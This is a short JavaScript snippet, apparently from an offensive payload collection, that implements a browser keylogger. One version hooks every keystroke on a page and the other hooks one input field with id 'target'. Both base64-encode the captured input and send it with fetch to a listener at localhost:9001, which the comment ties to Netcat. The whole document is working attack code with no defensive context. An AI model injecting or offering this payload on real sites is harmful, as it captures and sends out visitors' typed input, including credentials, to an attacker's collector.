
//via Netcat
//version full page
document.onkeyup = function(e) {
    fetch('https://localhost:9001/log?key=' + btoa(e.key) );
}

//Version targer one input with specific id
document.querySelector('#target').addEventListener('change', function(e) {
    fetch('https://localhost:9001/log?key=' + btoa(e.value) );
});
